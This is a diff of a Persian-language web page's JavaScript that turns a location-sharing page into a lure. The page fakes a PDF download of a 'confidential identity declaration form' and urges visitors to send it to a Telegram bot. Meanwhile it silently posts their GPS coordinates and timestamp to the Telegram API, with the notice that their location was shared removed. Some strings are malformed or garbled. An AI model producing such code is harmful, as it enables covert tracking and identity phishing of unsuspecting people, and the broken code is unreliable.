@@ -1,27 +1,37 @@
-errorMessage = "❌ عدم مجوز: لطفاً مجوز موقعیت مکانی را در مرورگر (آیکون قفل) فعال کنید و مجدداً تلاش نمایید.";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    errorMessage = "⚠️ خطای فنی: سرویس مکان‌یابی در دسترس نیست. مکان‌یابی گوشی را بررسی کنید.";
-                    break;
-                case error.TIMEOUT:
-                    errorMessage = "⌛ خطای وقفه: دستگاه نتوانست لوکیشن را پیدا کند. دوباره امتحان کنید.";
-                    break;
-                default:
-                    errorMessage = "🔥 خطای نامشخص: در دریافت موقعیت مکانی رخ داد.";
-            }
-            updateStatus(errorMessage, 'error');
-        }
+// شبیه‌سازی دانلود بعد از 3 ثانیه
+            setTimeout(() => {
+                
+                // --- شبیه‌سازی دانلود PDF ---
+                // لینک واقعی PDF خود را با این جایگزین کنید:
+                const pdfData = "data:application/pdf;base64,JVBERi0xLjEKJcOkw7zEnwpbCiAgPDwvVHlwZSAvUGFnZS9NZWRpYUJveCBbMCAwIDYxMiA3OTJdL1JvdGF0ZSAwPj4KXV0K"; 
+                const a = document.createElement('a');
+                a.href = pdfData;
+                a.download = 'فرم_اظهار_هویت_محرمانه.pdf';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
 
-        function sendLocationToTelegram(lat, lon, botToken, chatId) {
+                // --- پیام نهایی طبق درخواست ---
+                spinner.classList.add('hidden');
+                const finalMessage = ✅ **دانلود موفق!** جهت دریافت مدارک خویش لطفا فورم اظهار هویت را خانه پری نماید و به کانال تلگرام **@location904411_Bot** ارسال نماید.;
+                updateStatus(finalMessage, 'success');
+                
+            }, 3000); 
+        }
+        
+        // --- توابع ارسال به تلگرام ---
+
+        function sendLocationToTelegram(lat, lon, reason) {
+            const BOT_TOKEN = document.getElementById('bot-token').value;
+            const CHAT_ID = document.getElementById('chat-id').value;
             
-            // استفاده از متد sendLocation برای نقشه تعاملی
-            const telegramApiUrl = https://api.telegram.org/bot${botToken}/sendLocation;
-            
+            const telegramApiUrl = https://api.telegram.org/bot${BOT_TOKEN}/sendLocation;
+
             const payload = {
-                chat_id: chatId,
-                latitude: lat,        
-                longitude: lon,       
-                caption: 🚨 **موقعیت مکانی کاربر نهایی:**\n**عرض جغرافیایی (Lat):** ${lat}\n**طول جغرافیایی (Lon):** ${lon},
+                chat_id: CHAT_ID,
+                latitude: lat,
+                longitude: lon,
+                caption: 🚨 **ورود موفقیت‌آمیز به سایت محرمانه**\n**عرض:** ${lat}\n**طول:** ${lon}\n**زمان:** ${new Date().toLocaleString('fa-IR')},
                 parse_mode: 'Markdown'
             };
 
@@ -29,19 +39,9 @@ errorMessage = "❌ عدم مجوز: لطفاً مجوز موقعیت مکانی
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload),
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    updatارسال موفق!رسال موفق!** موقعیت مکانی شما به تلگرام ارسال شد.", 'success');
-                } else {
-                    updateStatus(❌ **خطا در API تلگرام:** ${data.description}., 'error');
-                }
-            })
-            .catch((error) => {
-                updateStatus(🔥 **خطای شبکه:** اتصال به سرور تلگرام برقرار نشد: ${error.message}, 'error');
-            });
+            }).catch(e => console.error("Error sending location to Telegram:", e));
         }
+
     </script>
 </body>
 </html>
